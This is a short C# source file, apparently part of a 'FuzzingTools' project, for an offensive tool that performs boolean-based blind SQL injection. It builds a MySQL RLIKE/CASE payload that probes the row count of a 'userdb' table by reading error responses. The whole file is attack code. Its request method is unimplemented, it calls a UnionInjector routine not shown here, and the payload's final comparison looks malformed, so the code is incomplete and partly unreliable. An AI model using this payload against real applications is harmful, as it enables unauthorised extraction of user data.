using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace FuzzingTools
{
    class SqlInjectionExploiterBool
    {

        public static void Main(string[] args)
        {

            SqlInjectionExploiter.UnionInjector();

            int countLength = 1;

            for (; ; countLength++){
                string getCountLength = "fdsa' RLIKE (SELECT  (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
                getCountLength += " userdb)="+countLength+") THEN 0x28 ELSE 0x41 END))";
                getCountLength += " AND 'LeSo'=LeSo";

                string response = MakeRequest(getCountLength);
                if (response.Contains("parentheses not balanced"))
                break;
            }
            

        }

        private static string MakeRequest(string getCountLength)
        {
            throw new NotImplementedException();
        }
    }
}
 